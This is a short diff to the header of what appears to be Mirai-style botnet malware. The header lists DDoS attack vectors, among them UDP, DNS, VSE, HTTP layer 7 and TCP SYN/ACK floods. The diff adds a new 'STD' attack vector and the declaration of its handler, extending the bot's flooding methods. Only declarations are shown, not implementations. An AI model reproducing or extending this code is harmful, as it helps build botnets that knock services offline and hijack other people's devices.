@@ -42,6 +42,7 @@ typedef uint8_t ATTACK_VECTOR;
 //#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
 #define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
 #define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
+#define ATK_VEC_STD        11
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
 #define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
@@ -155,6 +156,7 @@ void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_
 void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
